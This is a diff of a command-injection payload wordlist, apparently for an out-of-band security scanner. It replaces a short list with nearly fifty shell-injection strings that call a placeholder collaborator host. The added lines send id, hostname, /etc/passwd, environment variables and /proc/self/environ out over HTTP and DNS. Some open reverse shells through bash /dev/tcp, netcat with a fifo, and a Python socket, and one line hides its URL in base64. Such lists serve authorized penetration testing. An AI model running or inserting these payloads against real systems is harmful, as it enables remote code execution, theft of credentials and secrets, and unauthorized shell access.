@@ -1,11 +1,49 @@
-;nslookup COLLABORATOR
-;curl http://COLLABORATOR
-;wget http://COLLABORATOR
-;ping -c 1 COLLABORATOR
-;dig COLLABORATOR
-$(curl http://COLLABORATOR)
-`curl http://COLLABORATOR`
-;curl -d "$(id)" http://COLLABORATOR
-;curl http://COLLABORATOR/$(id|base64)
-;wget -q -O- http://COLLABORATOR/?c=$(id|base64)
-;bash -i >& /dev/tcp/COLLABORATOR/4444 0>&1
+; curl http://COLLABORATOR_URL/`id`
+; curl http://COLLABORATOR_URL/`whoami`
+; curl http://COLLABORATOR_URL/`hostname`
+; curl http://COLLABORATOR_URL/`uname -a | base64`
+; wget http://COLLABORATOR_URL/`id`
+; wget http://COLLABORATOR_URL/`whoami`
+; nslookup `id`.COLLABORATOR_URL
+; nslookup `whoami`.COLLABORATOR_URL
+; nslookup `hostname`.COLLABORATOR_URL
+; host `id`.COLLABORATOR_URL
+; dig `id`.COLLABORATOR_URL
+; ping -c 1 `id`.COLLABORATOR_URL
+; curl -d @/etc/passwd http://COLLABORATOR_URL/
+; curl -d @/etc/hosts http://COLLABORATOR_URL/
+; curl -d @/proc/self/environ http://COLLABORATOR_URL/
+; curl -F "f=@/etc/passwd" http://COLLABORATOR_URL/
+; wget --post-file=/etc/passwd http://COLLABORATOR_URL/
+; nc COLLABORATOR_IP 4444 < /etc/passwd
+; cat /etc/passwd | nc COLLABORATOR_IP 4444
+; cat /etc/passwd > /dev/tcp/COLLABORATOR_IP/4444
+; bash -i >& /dev/tcp/COLLABORATOR_IP/4444 0>&1
+; 0<&196;exec 196<>/dev/tcp/COLLABORATOR_IP/4444
+; curl http://COLLABORATOR_URL/?x=$(cat /etc/passwd | base64)
+; curl http://COLLABORATOR_URL/?x=$(id | base64)
+; curl http://COLLABORATOR_URL/?x=$(hostname | base64)
+; python3 -c 'import urllib.request; urllib.request.urlopen("http://COLLABORATOR_URL/" + __import__("subprocess").check_output("id",shell=True).decode())'
+; perl -e 'use LWP::Simple; get("http://COLLABORATOR_URL/".`id`);'
+; php -r 'file_get_contents("http://COLLABORATOR_URL/".shell_exec("id"));'
+; ruby -e 'require "open-uri"; open("http://COLLABORATOR_URL/"+`id`)'
+; curl $(echo aHR0cDovL0NPTExBQk9SQVRPUl9VUkwv | base64 -d)`id`
+; X=$(id);curl http://COLLABORATOR_URL/$X
+; curl http://COLLABORATOR_URL/$(cat /etc/passwd | head -1 | base64 -w 0)
+; nslookup $(cat /etc/hostname).COLLABORATOR_URL
+; dig $(id | cut -d' ' -f1).COLLABORATOR_URL
+; nslookup -q=TXT $(id).COLLABORATOR_URL
+; nslookup $(whoami).COLLABORATOR_URL
+; curl -sS "http://COLLABORATOR_URL/$(cat /etc/passwd|base64 -w0)"
+; curl "http://COLLABORATOR_URL/" -H "X-Data: $(id)"
+; curl "http://COLLABORATOR_URL/" -H "X-Data: $(cat /etc/passwd)"
+; curl "http://COLLABORATOR_URL/" --data-urlencode "data=$(cat /etc/passwd)"
+; mkfifo /tmp/f; nc COLLABORATOR_IP 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
+; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("COLLABORATOR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; curl -k https://COLLABORATOR_URL/?data=$(env|base64 -w0)
+; curl http://COLLABORATOR_URL/?$(cat /etc/hostname)
+; wget http://COLLABORATOR_URL/$(cat /etc/hostname)
+$(curl -s http://COLLABORATOR_URL/?id=$(id|base64))
+`curl -s http://COLLABORATOR_URL/?id=$(id|base64)`
+; curl -X POST http://COLLABORATOR_URL/ --data "$(env)"
+; curl -X POST http://COLLABORATOR_URL/ --data "$(cat /proc/self/environ)"
